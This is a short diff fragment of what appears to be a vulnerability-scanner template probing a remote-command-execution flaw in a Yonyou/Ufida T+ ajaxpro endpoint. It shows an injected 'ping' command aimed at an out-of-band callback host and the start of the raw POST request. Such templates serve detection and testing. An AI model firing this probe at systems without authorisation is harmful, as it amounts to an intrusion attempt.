@@ -19,7 +19,7 @@ variables:
   dns: "{{interactsh-url}}"
   cmd: "ping {{dns}}"
 
-http:
+requests:
   - raw:
       - |
         POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
